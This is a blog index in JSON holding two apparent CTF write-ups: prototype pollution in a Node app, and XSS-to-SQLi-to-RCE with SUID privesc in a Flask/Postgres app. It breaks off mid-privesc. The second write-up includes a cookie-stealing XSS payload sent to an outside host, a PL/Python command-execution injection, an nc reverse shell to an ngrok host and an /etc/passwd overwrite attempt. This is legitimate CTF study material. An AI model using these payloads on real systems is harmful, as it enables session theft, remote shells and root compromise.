[
  
  {
    "title": "BrunnerCTF - Recipe For Disaster",
    "url": "/posts/brunnerctf-recipe-for-disaster/",
    "categories": "Writeups, CTFTime2025, BrunnerCTF",
    "tags": "writeups, web, node, prototype-polution",
    "date": "2025-08-22 16:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Reading Source Code      Identifying vulnerabilities        Exploitation          Get admin      SQLi to RCE      Get reverse shell  ...",
    "content": "  Introduction          Description        Enumeration          Reading Source Code      Identifying vulnerabilities        Exploitation          Get admin      SQLi to RCE      Get reverse shell      User flag        Privesc          Stabilizing Shell      Abusing /usr/local/bin/cake_logger      Root flag      IntroductionDescription  Difficulty: Medium/Hard  The small town of Bruncity is famous for its sweet, sticky Brunsviger. At the local bakery, a brand new system has been set up to keep track of recipes and export them for the hungry townsfolk. But the oven seems to behave strangely.The head baker swears something isn’t quite right with the way it works. If you poke around long enough, perhaps you’ll discover the bakery’s secret ingredient…EnumerationReading Source CodeSource code was provided with the challenge description:❯ tree            .├── docker-compose.yml├── Dockerfile├── package.json├── public│   ├── index.html│   └── style.css└── server.js  server.js  const express = require('express');const helmet = require('helmet');const morgan = require('morgan');const bodyParser = require('body-parser');const fs = require('fs');const fsp = fs.promises;const path = require('path');const { exec } = require('child_process');const app = express();app.use(helmet());app.use(morgan('dev'));app.use(bodyParser.json());app.use(bodyParser.urlencoded({ extended: true })); app.use(express.static(path.join(__dirname, 'public')));app.locals.settings = {    theme: 'brunsviger',    glaze: 'brown-sugar',    exportOptions: {        timeout: 5000,        maxBuffer: 1024 * 1024,    }};function deepMerge(t, s) {    for (const k of Object.keys(s)) {        const v = s[k];        if (v &amp;&amp; typeof v === 'object' &amp;&amp; !Array.isArray(v)) {            if (!t[k]) t[k] = {};            deepMerge(t[k], v);         } else {            t[k] = v;         }    }    return t;}function sanitizeName(n) {    n = String(n || '').toLowerCase();    if (!/^[a-z0-9_-]{1,32}$/.test(n)) return null;    return n;}function sanitizeFilename(n) {    n = String(n || 'recipe.txt');    if (!/^[a-zA-Z0-9_.-]{1,64}$/.test(n)) return null;    return n;}app.get('/', (req, res) =&gt; {    res.sendFile(path.join(__dirname, 'public', 'index.html'));});app.post('/api/settings', (req, res) =&gt; {    try {        deepMerge(app.locals.settings, req.body);        if (            app.locals.settings.exportOptions &amp;&amp;            Object.prototype.hasOwnProperty.call(app.locals.settings.exportOptions, 'env')        ) {            delete app.locals.settings.exportOptions.env;        }        res.json({ ok: true, settings: app.locals.settings });    } catch (e) {        res.status(400).json({ ok: false, error: String(e) });    }});app.post('/api/note', async (req, res) =&gt; {    try {        const name = sanitizeName(req.body.name);        const filename = sanitizeFilename(req.body.filename || 'recipe.txt');        if (!name || !filename) return res.status(400).json({ ok: false, error: 'bad name/filename' });        const content = String(req.body.content || '');        const makeExecutable = String(req.body.makeExecutable || '') === 'true';        const dir = path.join(__dirname, 'data', name);        await fsp.mkdir(dir, { recursive: true });        const filePath = path.join(dir, filename);        await fsp.writeFile(filePath, content, { mode: 0o644 });        if (makeExecutable) {            await fsp.chmod(filePath, 0o755); // \"helper scripts\" are allowed, right? :)        }        res.json({ ok: true, path: `data/${name}/${filename}` });    } catch (e) {        res.status(500).json({ ok: false, error: String(e) });    }});app.get('/export', async (req, res) =&gt; {    try {        const name = sanitizeName(req.query.name);        if (!name) return res.status(400).type('text/plain').send('Bad cake name');        const dataDir = path.join(__dirname, 'data', name);        const tmpDir = path.join(__dirname, 'tmp');        await fsp.mkdir(tmpDir, { recursive: true });        const quoted = \"'\" + name.replace(/'/g, \"'\\\\''\") + \"'\";        const out = path.join('tmp', `${name}.zip`);        const cmd = `zip -r ${out} ./data/${quoted}`;         const baseOpts = Object.assign({}, app.locals.settings.exportOptions || {});        const envFromSettings = baseOpts.env || {};        const env = Object.assign({}, process.env, envFromSettings);        const opts = Object.assign({}, baseOpts, { cwd: __dirname, env });        exec(cmd, opts, (err, stdout, stderr) =&gt; {            res.type('text/plain').send(                (stdout || '') + (stderr || '') + (err ? '\\nERR\\n' : '\\nOK\\n')            );        });    } catch (e) {        res.status(500).type('text/plain').send('Internal oven failure: ' + String(e));    }});const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; {    console.log(`Brunsviger Bakery listening on http://127.0.0.1:${PORT}`);});  ExploitationFirst modify env and especially env.PATH via prototype pollutioncurl -X POST \"https://recipe-for-disaster-70eb692221a809d1.challs.brunnerne.xyz/api/settings\" \\-H 'Content-Type: application/json' \\-d '{  \"constructor\": {    \"prototype\": {      \"env\": {        \"PATH\": \"./data/attacker:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:./data/attacker\"      }    }  }}'{\"ok\":true,\"settings\":{\"theme\":\"brunsviger\",\"glaze\":\"brown-sugar\",\"exportOptions\":{\"timeout\":5000,\"maxBuffer\":1048576}}}Now, create a malicious zip file with the executable permission that displays the flag:curl -X POST https://recipe-for-disaster-70eb692221a809d1.challs.brunnerne.xyz/api/note \\-H 'Content-Type: application/json' \\-d '{  \"name\": \"attacker\",   \"filename\": \"zip\",   \"content\": \"#!/usr/local/bin/node\\nconst fs = require(\\\"fs\\\"); console.log(eval(fs.readFileSync(\\\"/flag.txt\\\", \\\"utf-8\\\")));\", \"makeExecutable\": \"true\"}'{\"ok\":true,\"path\":\"data/attacker/zip\"}Call the endpoint that executes zip, after modifying the env it will execute our malicious zip:curl \"https://recipe-for-disaster-70eb692221a809d1.challs.brunnerne.xyz/export?name=attacker\"     undefined:1brunner{pr0t0typ3_p0llu710n_0v3rf10w1ng_7h3_0v3n}       ^SyntaxError: Unexpected token '{'    at Object.&lt;anonymous&gt; (/app/data/attacker/zip:2:47)    at Module._compile (node:internal/modules/cjs/loader:1364:14)    at Module._extensions..js (node:internal/modules/cjs/loader:1422:10)    at Module.load (node:internal/modules/cjs/loader:1203:32)    at Module._load (node:internal/modules/cjs/loader:1019:12)    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:128:12)    at node:internal/main/run_main_module:28:49Node.js v18.20.8ERRIt fails to eval the flag, so it displays it on the screen, his is the most straight-forward way to exfiltrate the flag in my opinion."
  },
  
  {
    "title": "BrunnerCTF - Cake Architect",
    "url": "/posts/brunnerctf-cake-architect/",
    "categories": "Writeups, CTFTime2025, BrunnerCTF",
    "tags": "writeups, boot2root, flask, xss, sql-injection, privesc, suid",
    "date": "2025-08-22 16:00:00 +0000",
    





    
    "snippet": "  Introduction          Description        Enumeration          Reading Source Code      Identifying vulnerabilities        Exploitation          Get admin      SQLi to RCE      Get reverse shell  ...",
    "content": "  Introduction          Description        Enumeration          Reading Source Code      Identifying vulnerabilities        Exploitation          Get admin      SQLi to RCE      Get reverse shell      User flag        Privesc          Stabilizing Shell      Abusing /usr/local/bin/cake_logger      Root flag      IntroductionDescription  Difficulty: Hard  We’ve exhausted all possible ideas regarding baking recipes. Please help us design a new cake!The user flag is in a file called user.txt.EnumerationReading Source CodeSource code was provided with the challenge description:❯ tree            .├── app│   ├── admin_bot.py│   ├── app.py│   ├── database.py│   ├── init_db.sql│   ├── static│   │   └── js│   │       └── admin.js│   ├── templates│   │   ├── admin.html│   │   ├── cake_builder.html│   │   ├── dashboard.html│   │   ├── index.html│   │   ├── login.html│   │   ├── report_issue.html│   │   ├── signup.html│   │   └── view_cake.html│   └── utils.py├── cake_logger├── docker-compose.yml├── Dockerfile├── Dockerfile.db└── requirements.txt  Dockerfile.db  FROM postgres:15-bookwormRUN apt-get update &amp;&amp; \\    apt-get install -y postgresql-plpython3-15 curl netcat-traditional python3 &amp;&amp; \\    rm -rf /var/lib/apt/lists/*RUN echo \"brunner{&lt;USER&gt;...}\" &gt; /user.txtRUN chown postgres:postgres /user.txtRUN echo \"brunner{&lt;ROOT&gt;...}\" &gt; /root/root.txtRUN chmod 400 /root/root.txtCOPY cake_logger /usr/local/bin/cake_loggerRUN chmod +x /usr/local/bin/cake_loggerRUN chown root:root /usr/local/bin/cake_loggerRUN chmod 4755 /usr/local/bin/cake_loggerCOPY /app/init_db.sql /docker-entrypoint-initdb.d/init_db.sql    Dockerfile  FROM python:3.12-slim-bookwormENV PYTHONUNBUFFERED=1# Install system dependenciesRUN apt-get update &amp;&amp; apt-get install -y \\    postgresql-client \\    postgresql-plpython3-15 \\    &amp;&amp; rm -rf /var/lib/apt/lists/*# Set working directoryWORKDIR /app# Copy requirements and install Python dependenciesCOPY requirements.txt .RUN pip install --no-cache-dir -r requirements.txt# Install Playwright browsersRUN playwright install-depsRUN playwright install chromium# Copy application codeCOPY ./app .# Expose portEXPOSE 5000# Start the applicationCMD [\"python\", \"app.py\"]    docker-compose.yml  services:  db:    build:      context: .      dockerfile: Dockerfile.db    environment:      POSTGRES_DB: cake_db      POSTGRES_USER: postgres      POSTGRES_PASSWORD: 871576ad349c9b16620685b58ab569ce    ports:      - \"5432:5432\"  web:    build: .    ports:      - \"5000:5000\"    environment:      FLASK_ENV: development      POSTGRES_PASSWORD: 871576ad349c9b16620685b58ab569ce    restart: unless-stopped    app/app.py  from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flashimport os# Import our modulesfrom utils import get_or_generate_admin_password, login_required, admin_requiredfrom database import (    init_db_pool, wait_for_db, setup_users, setup_sample_cakes,    get_user_by_credentials, create_user, get_user_cakes, get_cake_by_id,    save_cake, get_all_users, calculate_nutrition)from admin_bot import start_admin_botapp = Flask(__name__)app.secret_key = os.urandom(64).hex()app.config['SESSION_COOKIE_HTTPONLY'] = False# Routes@app.route('/')def index():    if 'user_id' in session:        return redirect(url_for('dashboard'))    return render_template('index.html')@app.route('/signup', methods=['GET', 'POST'])def signup():    if request.method == 'POST':        username = request.form.get('username')        password = request.form.get('password')        email = request.form.get('email')                if not username or not password or not email:            flash('All fields are required', 'error')            return render_template('signup.html')                # Basic validation        if len(username) &lt; 3 or len(password) &lt; 6:            flash('Username must be at least 3 characters and password at least 6', 'error')            return render_template('signup.html')                if create_user(username, email, password):            flash('Account created successfully! Please log in.', 'success')            return redirect(url_for('login'))        else:            flash('Registration failed', 'error')        return render_template('signup.html')@app.route('/login', methods=['GET', 'POST'])def login():    if request.method == 'POST':        username = request.form.get('username')        password = request.form.get('password')                if not username or not password:            flash('Username and password are required', 'error')            return render_template('login.html')                user = get_user_by_credentials(username, password)                if user:            session['user_id'] = user[0]            session['username'] = user[1]            session['role'] = user[2]            flash('Login successful!', 'success')            return redirect(url_for('dashboard'))        else:            flash('Invalid username or password', 'error')        return render_template('login.html')@app.route('/logout')def logout():    session.clear()    flash('Logged out successfully', 'success')    return redirect(url_for('index'))@app.route('/dashboard')@login_requireddef dashboard():    cakes = get_user_cakes(session['username'])    return render_template('dashboard.html', cakes=cakes, user=session)@app.route('/cake/&lt;int:cake_id&gt;')@login_requireddef view_cake(cake_id):    cake = get_cake_by_id(cake_id)        if not cake:        flash('Cake not found', 'error')        return redirect(url_for('dashboard'))        # Check if user can view this cake    if not cake[5] and cake[4] != session['username'] and session.get('role') != 'admin':        flash('Access denied', 'error')        return redirect(url_for('dashboard'))        return render_template('view_cake.html', cake=cake, user=session)@app.route('/report-issue', methods=['GET', 'POST'])@login_requireddef report_issue():    if request.method == 'POST':        cake_id = request.form.get('cake_id')        issue_description = request.form.get('issue_description')                if not cake_id or not issue_description:            flash('Cake ID and issue description are required', 'error')            return render_template('report_issue.html')                try:            # Validate cake_id is numeric            if not cake_id.isdigit():                flash('Invalid Cake ID format', 'error')                return render_template('report_issue.html')            base_url = 'http://localhost:5000'            cake_url = f\"{base_url}/cake/{cake_id}\"            start_admin_bot(cake_url, admin_pass)            flash('Issue reported successfully! An admin will review it soon.', 'success')            return redirect(url_for('dashboard'))        except Exception as e:            print(f\"❌ Report issue error: {e}\")            flash('Failed to process the issue report', 'error')    return render_template('report_issue.html')@app.route('/admin')@admin_requireddef admin_dashboard():    users = get_all_users()    return render_template('admin.html', users=users)@app.route('/admin/calculate-nutrition', methods=['POST'])@admin_requireddef calculate_nutrition_route():    cake_id = request.json.get('cake_id', 0)    result = calculate_nutrition(cake_id)    if result is None:        return jsonify({'error': 'Procedure failed or not found'}), 400    return jsonify({'result': result})@app.route('/cake-builder')@login_requireddef cake_builder():    return render_template('cake_builder.html')@app.route('/api/save-cake', methods=['POST'])@login_requireddef save_cake_api():    data = request.get_json()    name = data.get('name', '')    ingredients = data.get('ingredients', {})    instructions = data.get('instructions', '')        if not name or not ingredients:        return jsonify({'error': 'Name and ingredients are required'}), 400        if save_cake(name, ingredients, instructions, session['username']):        return jsonify({'status': 'success', 'message': 'Cake saved successfully'})    else:        return jsonify({'error': 'Failed to save cake'}), 400if __name__ == '__main__':    if wait_for_db():        init_db_pool()                # Set up initial data        admin_pass = get_or_generate_admin_password()        setup_users(admin_pass)        setup_sample_cakes()                app.run(host='0.0.0.0', debug=True)    else:        print(\"Failed to start application due to database connection issues\")    app/database.py  import psycopg2import psycopg2.poolimport timeimport jsonfrom utils import hash_password# Database configurationDB_CONFIG = {    'dbname': 'cake_db',    'user': 'postgres',    'password': '871576ad349c9b16620685b58ab569ce',    'host': 'db',    'port': 5432}db_pool = Nonedef init_db_pool():    \"\"\"Initialize database connection pool\"\"\"    global db_pool    try:        db_pool = psycopg2.pool.SimpleConnectionPool(            minconn=1,            maxconn=20,            **DB_CONFIG        )        print(\"Database connection pool initialized successfully\")    except Exception as e:        print(f\"Failed to initialize database pool: {e}\")        db_pool = Nonedef get_db():    \"\"\"Get a database connection from the pool\"\"\"    global db_pool    if db_pool is None:        return psycopg2.connect(**DB_CONFIG)    return db_pool.getconn()def return_db(conn):    \"\"\"Return a database connection to the pool\"\"\"    global db_pool    if db_pool is not None:        db_pool.putconn(conn)    else:        conn.close()def wait_for_db():    \"\"\"Wait for database to be ready\"\"\"    max_retries = 30    retry_count = 0        while retry_count &lt; max_retries:        try:            conn = psycopg2.connect(**DB_CONFIG)            conn.close()            print(\"Database is ready!\")            return True        except psycopg2.OperationalError:            print(f\"Database not ready, retrying... ({retry_count + 1}/{max_retries})\")            retry_count += 1            time.sleep(2)        print(\"Failed to connect to database after maximum retries\")    return Falsedef setup_users(admin_pass):    \"\"\"Set up initial users in the database\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()                # Create admin user        admin_password_hash = hash_password(admin_pass)        cur.execute(\"\"\"            INSERT INTO users (username, email, password, role)             VALUES (%s, %s, %s, %s)            ON CONFLICT (username) DO NOTHING        \"\"\", ('admin', 'admin@cakearchitect.com', admin_password_hash, 'admin'))                conn.commit()        print(f\"✅ Admin user created with password: {admin_pass}\")            except Exception as e:        print(f\"❌ Error setting up users: {e}\")        if conn:            conn.rollback()    finally:        if conn:            return_db(conn)def setup_sample_cakes():    \"\"\"Set up sample cakes in the database\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()                # Sample cakes        cakes = [            {                'name': 'Classic Chocolate Cake',                'ingredients': {\"flour\": \"2 cups\", \"sugar\": \"1 cup\", \"cocoa\": \"1 cup\"},                'instructions': 'Mix dry ingredients, add wet ingredients, bake at 350F for 30 minutes',                'created_by': 'admin',                'is_public': True            },            {                'name': 'Vanilla Sponge Cake',                'ingredients': {\"flour\": \"1 cup\", \"sugar\": \"1 cup\", \"eggs\": \"3\"},                'instructions': 'Beat eggs and sugar, fold in flour, bake at 325F for 25 minutes',                'created_by': 'admin',                'is_public': True            }        ]                for cake in cakes:            ingredients_json = json.dumps(cake['ingredients'])            cur.execute(\"\"\"                INSERT INTO cakes (name, ingredients, instructions, created_by, is_public)                 VALUES (%s, %s, %s, %s, %s)                ON CONFLICT DO NOTHING            \"\"\", (cake['name'], ingredients_json, cake['instructions'], cake['created_by'], cake['is_public']))                conn.commit()        print(\"✅ Sample cakes created\")            except Exception as e:        print(f\"❌ Error setting up cakes: {e}\")        if conn:            conn.rollback()    finally:        if conn:            return_db(conn)def get_user_by_credentials(username, password):    \"\"\"Get user by username and password\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()                hashed_password = hash_password(password)        cur.execute(\"SELECT id, username, role FROM users WHERE username = %s AND password = %s\",                    (username, hashed_password))        return cur.fetchone()            except Exception as e:        print(f\"Error getting user: {e}\")        return None    finally:        if conn:            return_db(conn)def create_user(username, email, password, role='user'):    \"\"\"Create a new user\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()                hashed_password = hash_password(password)        cur.execute(\"INSERT INTO users (username, email, password, role) VALUES (%s, %s, %s, %s)\",                   (username, email, hashed_password, role))        conn.commit()        return True            except Exception as e:        print(f\"Error creating user: {e}\")        if conn:            conn.rollback()        return False    finally:        if conn:            return_db(conn)def get_user_cakes(username):    \"\"\"Get cakes for a user (their own + public ones)\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()        cur.execute(\"SELECT id, name, created_by FROM cakes WHERE created_by = %s OR is_public = true\",                    (username,))        return cur.fetchall()            except Exception as e:        print(f\"Error getting cakes: {e}\")        return []    finally:        if conn:            return_db(conn)def get_cake_by_id(cake_id):    \"\"\"Get a cake by ID\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()        cur.execute(\"SELECT id, name, ingredients, instructions, created_by, is_public FROM cakes WHERE id = %s\", (cake_id,))        return cur.fetchone()            except Exception as e:        print(f\"Error getting cake: {e}\")        return None    finally:        if conn:            return_db(conn)def save_cake(name, ingredients, instructions, created_by):    \"\"\"Save a new cake\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()                ingredients_json = json.dumps(ingredients)        cur.execute(\"INSERT INTO cakes (name, ingredients, instructions, created_by) VALUES (%s, %s, %s, %s)\",                   (name, ingredients_json, instructions, created_by))        conn.commit()        return True            except Exception as e:        print(f\"Error saving cake: {e}\")        return False    finally:        if conn:            return_db(conn)def get_all_users():    \"\"\"Get all users for admin panel\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()        cur.execute(\"SELECT id, username, email, role, created_at FROM users ORDER BY created_at DESC\")        return cur.fetchall()            except Exception as e:        print(f\"Error getting users: {e}\")        return []    finally:        if conn:            return_db(conn)def calculate_nutrition(cake_id):    \"\"\"Calculate nutrition for a cake\"\"\"    conn = None    try:        conn = get_db()        cur = conn.cursor()        query = f\"SELECT ingredients FROM cakes WHERE id = {cake_id}\"        cur.execute(query)        plan = cur.fetchall()        if not plan:            return json.dumps({\"error\": \"Cake not found\"})        # Handle both JSON string and already parsed dict        ingredients_data = plan[0][0]        if isinstance(ingredients_data, str):            ingredients = json.loads(ingredients_data)        else:            ingredients = ingredients_data  # Already a dict                    total = 0        for ing in ingredients:            # Extract the quantity from strings like \"2 cups\", \"1 cup\", \"3\"            quantity_str = ingredients[ing].split(' ')[0]            try:                total += int(quantity_str)            except ValueError:                # If we can't parse as int, try to extract number from string                import re                numbers = re.findall(r'\\d+', quantity_str)                if numbers:                    total += int(numbers[0])        return json.dumps({            \"cake_id\": cake_id,            \"calculated\": {                \"calories\": total * 50,                \"fat\": total * 2,                \"protein\": total * 1.5            }        })    except Exception as e:        return json.dumps({\"error\": str(e)})    finally:        if conn:            return_db(conn)    app/templates/view_cake.html  &lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;    &lt;meta charset=\"UTF-8\"&gt;    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;    &lt;title&gt;{{ cake[1] }} - Cake Architect&lt;/title&gt;    &lt;link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;    &lt;link href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css\" rel=\"stylesheet\"&gt;    &lt;style&gt;        .sidebar {            min-height: 100vh;            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);        }        .cake-detail {            border: none;            border-radius: 15px;            box-shadow: 0 5px 15px rgba(0,0,0,0.1);        }        .ingredient-item {            background: #f8f9fa;            border-radius: 8px;            padding: 10px;            margin: 5px 0;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=\"container-fluid\"&gt;        &lt;div class=\"row\"&gt;            &lt;!-- Sidebar --&gt;            &lt;nav class=\"col-md-3 col-lg-2 d-md-block sidebar collapse\"&gt;                &lt;div class=\"position-sticky pt-3\"&gt;                    &lt;div class=\"text-center mb-4\"&gt;                        &lt;i class=\"fas fa-birthday-cake fa-2x text-white mb-2\"&gt;&lt;/i&gt;                        &lt;h5 class=\"text-white\"&gt;Cake Architect&lt;/h5&gt;                    &lt;/div&gt;                                        &lt;ul class=\"nav flex-column\"&gt;                        &lt;li class=\"nav-item\"&gt;                            &lt;a class=\"nav-link text-white\" href=\"/dashboard\"&gt;                                &lt;i class=\"fas fa-home me-2\"&gt;&lt;/i&gt;                                Dashboard                            &lt;/a&gt;                        &lt;/li&gt;                        &lt;li class=\"nav-item\"&gt;                            &lt;a class=\"nav-link text-white\" href=\"/cake-builder\"&gt;                                &lt;i class=\"fas fa-plus me-2\"&gt;&lt;/i&gt;                                Create Cake                            &lt;/a&gt;                        &lt;/li&gt;                        &lt;li class=\"nav-item\"&gt;                            &lt;a class=\"nav-link text-white\" href=\"/report-issue\"&gt;                                &lt;i class=\"fas fa-exclamation-triangle me-2\"&gt;&lt;/i&gt;                                Report Issue                            &lt;/a&gt;                        &lt;/li&gt;                        {% if user.role == 'admin' %}                        &lt;li class=\"nav-item\"&gt;                            &lt;a class=\"nav-link text-white\" href=\"/admin\"&gt;                                &lt;i class=\"fas fa-cog me-2\"&gt;&lt;/i&gt;                                Admin Panel                            &lt;/a&gt;                        &lt;/li&gt;                        {% endif %}                        &lt;li class=\"nav-item\"&gt;                            &lt;a class=\"nav-link text-white\" href=\"/logout\"&gt;                                &lt;i class=\"fas fa-sign-out-alt me-2\"&gt;&lt;/i&gt;                                Logout                            &lt;/a&gt;                        &lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/nav&gt;            &lt;!-- Main content --&gt;            &lt;main class=\"col-md-9 ms-sm-auto col-lg-10 px-md-4\"&gt;                &lt;div class=\"d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom\"&gt;                    &lt;h1 class=\"h2\"&gt;Cake Details&lt;/h1&gt;                    &lt;div&gt;                        &lt;a href=\"/dashboard\" class=\"btn btn-secondary me-2\"&gt;                            &lt;i class=\"fas fa-arrow-left me-2\"&gt;&lt;/i&gt;Back to Dashboard                        &lt;/a&gt;                        &lt;a href=\"/report-issue\" class=\"btn btn-warning\"&gt;                            &lt;i class=\"fas fa-exclamation-triangle me-2\"&gt;&lt;/i&gt;Report Issue                        &lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                {% with messages = get_flashed_messages(with_categories=true) %}                    {% if messages %}                        {% for category, message in messages %}                            &lt;div class=\"alert alert-{{ 'danger' if category == 'error' else 'success' }} alert-dismissible fade show\" role=\"alert\"&gt;                                                                &lt;button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"alert\"&gt;&lt;/button&gt;                            &lt;/div&gt;                        {% endfor %}                    {% endif %}                {% endwith %}                &lt;div class=\"row\"&gt;                    &lt;div class=\"col-12\"&gt;                        &lt;div class=\"card cake-detail\"&gt;                            &lt;div class=\"card-header\"&gt;                                &lt;h3&gt;{{ cake[1] | safe }}&lt;/h3&gt;                                &lt;p class=\"text-muted mb-0\"&gt;Created by: &lt;/p&gt;                            &lt;/div&gt;                            &lt;div class=\"card-body\"&gt;                                &lt;div class=\"row\"&gt;                                    &lt;div class=\"col-md-6\"&gt;                                        &lt;h5&gt;&lt;i class=\"fas fa-list me-2\"&gt;&lt;/i&gt;Ingredients&lt;/h5&gt;                                        &lt;div id=\"ingredients-list\"&gt;                                            &lt;!-- Ingredients will be loaded here via JavaScript --&gt;                                        &lt;/div&gt;                                    &lt;/div&gt;                                    &lt;div class=\"col-md-6\"&gt;                                        &lt;h5&gt;&lt;i class=\"fas fa-clipboard-list me-2\"&gt;&lt;/i&gt;Instructions&lt;/h5&gt;                                        &lt;div class=\"border rounded p-3 bg-light\"&gt;                                            {{ cake[3] | safe if cake[3] else 'No instructions provided.' }}                                        &lt;/div&gt;                                    &lt;/div&gt;                                &lt;/div&gt;                                                                &lt;hr&gt;                                                                &lt;div class=\"d-flex justify-content-between align-items-center\"&gt;                                    &lt;div&gt;                                        &lt;span class=\"badge bg-primary\"&gt;Cake #&lt;/span&gt;                                        {% if cake[5] %}                                            &lt;span class=\"badge bg-success\"&gt;Public&lt;/span&gt;                                        {% else %}                                            &lt;span class=\"badge bg-warning\"&gt;Private&lt;/span&gt;                                        {% endif %}                                    &lt;/div&gt;                                    &lt;div&gt;                                        &lt;button class=\"btn btn-outline-success\" onclick=\"copyCakeUrl()\"&gt;                                            &lt;i class=\"fas fa-share me-2\"&gt;&lt;/i&gt;Share                                        &lt;/button&gt;                                    &lt;/div&gt;                                &lt;/div&gt;                            &lt;/div&gt;                        &lt;/div&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/main&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js\"&gt;&lt;/script&gt;    &lt;script&gt;        // Load and display ingredients        document.addEventListener('DOMContentLoaded', function() {            const ingredients = JSON.parse('{{ cake[2] | tojson | safe }}');            const ingredientsList = document.getElementById('ingredients-list');                        if (ingredients &amp;&amp; typeof ingredients === 'object') {                for (const [ingredient, amount] of Object.entries(ingredients)) {                    const ingredientDiv = document.createElement('div');                    ingredientDiv.className = 'ingredient-item';                    ingredientDiv.innerHTML = `&lt;strong&gt;${ingredient}:&lt;/strong&gt; ${amount}`;                    ingredientsList.appendChild(ingredientDiv);                }            } else {                ingredientsList.innerHTML = '&lt;p class=\"text-muted\"&gt;No ingredients listed.&lt;/p&gt;';            }        });        function copyCakeUrl() {            const cakeUrl = window.location.href;            navigator.clipboard.writeText(cakeUrl).then(() =&gt; {                alert('Cake URL copied to clipboard!');            }).catch(err =&gt; {                console.error('Failed to copy cake URL: ', err);                alert('Failed to copy cake URL.');            });        }    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;  Identifying vulnerabilities  The flask session cookie is NOT HTTP Only  There is an admin bot that visits “Show Cake” pages that we submit  We can create “Cakes” pages  The “Show cake” page is vulnerable to XSS, because data is inserted without sanitization, and shown with | safe which means: “Disable every automatic protections”.  The admin have access to an endpoint that is vulnerable to SQLi, calculate_nutrition(cake_id) directly does \"SELECT ingredients FROM cakes WHERE id = {cake_id}\" with cake_id a user supplied value.  The postgresql-plpython3-15 module is installed in the Docker.db, which means we can execute python via postgresql, that means that every SQLi can be escalated to an RCE.ExploitationGet adminSince we do not have access to the SQLi vulnerable endpoint because we’re not admin, we’ll start by stealing the admin session cookie. To do so, we need to signup, then login, to get access to this page:Dashboard pageWe hit the “New cake” button on the top-right corner. I will use this beeceptor endpoint to capture the token, and this simple XSS payload:&lt;script&gt;window.location.href = \"https://cookiestealer.free.beeceptor.com?cookie=\" + btoa(document.cookie)&lt;/script&gt; Exploiting the XSSOur newly created cake has the id number 10:ID = 10Let’s report this cake to the admin:Reporting the trapped show cake pageAdmin session tokenAnd here we go! Now we just have to base64 decode it, and add it in Ctrl + Shift + I, then to the storage tabUsing the stolen cookieSQLi to RCEAdmin dashboardOk, so now, we have access to the admin dashboard, and we have access to the SQLi vulnerable thing. As I said earlier, postgresql-plpython3 is installed, so it’es basically auto RCE. I’ll use this payload, from OWASP, to weaponize my SQLi into an RCE via arbitrary python execution:• CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu• SELECT proxyshell(os command)Get reverse shellI adapted the payload to get a reverse-shell:1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpython3u; SELECT proxyshell('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 0.tcp.eu.ngrok.io 13818 &gt;/tmp/f');I end the first query, use the CREATE FUNCTION thing to create my RCE function, then call it using a SELECT statement.Initial accessUser flagbrunner{XSS_y0UR_w4y_T0_Pyth0N3_1N_P0sTgR35?!}PrivescStabilizing ShellOk now to the most difficult part ! I start by stabilizing my shell:$ python3 -c \"import pty; pty.spawn('/bin/bash')\"postgres@ctf-cake-architect-user-dc97708dd266a162-5ffbff8cc9-sjl4j:~/data$ export TERM=xtermpostgres@ctf-cake-architect-user-dc97708dd266a162-5ffbff8cc9-sjl4j:~/data$ PS1=\"\\u \\w $ \"postgres ~/data $ Ctrl + Z❯ stty raw -echo &amp;&amp; fg[1]  + 53186 continued  nc -nvlp 4444postgres ~/data $   And we’re good to go.Abusing /usr/local/bin/cake_loggerAs you may have noticed, there is a custom root SUID binary called cake_logger added by the Dockerfile.db. Let’s try to execute it:postgres ~/data $ ls -lah /usr/local/bin/cake_logger -rwsr-xr-x. 1 root root 16K Aug 21 06:32 /usr/local/bin/cake_loggerpostgres ~/data $ /usr/local/bin/cake_loggerUsage:  To add recipe: /usr/local/bin/cake_logger &lt;recipe_file&gt; &lt;recipe_text&gt;  To create shortcut: /usr/local/bin/cake_logger -link &lt;source_recipe&gt; &lt;link_path&gt;Unfortunately we can’t write to a file that is not owned by us:postgres / $  /usr/local/bin/cake_logger /etc/passwd \"root::0:0::/root:/bin/bash\"Checking if you can modify the recipe...This recipe doesnt belong to you!And we can’t override files using the symlink options:postgres /dev/shm $ echo \"root::0:0::/root:/bin/bash\" &gt; my_new_passwdpostgres /dev/shm $ /usr/local/bin/cake_logger -link my_new_passwd /etc/passwd Creating a shortcut to your recipe...Failed to create recipe shortcut: File existsFortunately, we can create symlinks as root (so basically everywhere in 